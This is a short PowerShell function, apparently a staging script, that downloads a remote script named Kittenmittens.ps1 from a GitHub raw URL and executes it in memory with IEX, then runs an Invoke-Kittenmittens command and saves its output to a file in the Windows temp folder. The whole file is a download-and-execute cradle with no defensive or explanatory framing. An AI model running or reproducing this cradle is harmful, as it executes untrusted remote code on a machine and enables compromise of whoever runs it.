function Invoke-Start
{
	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/arduinotestpowershell/start/master/Kittenmittens.ps1'); 
	Invoke-Kittenmittens > c:\windows\temp\1.txt;
}
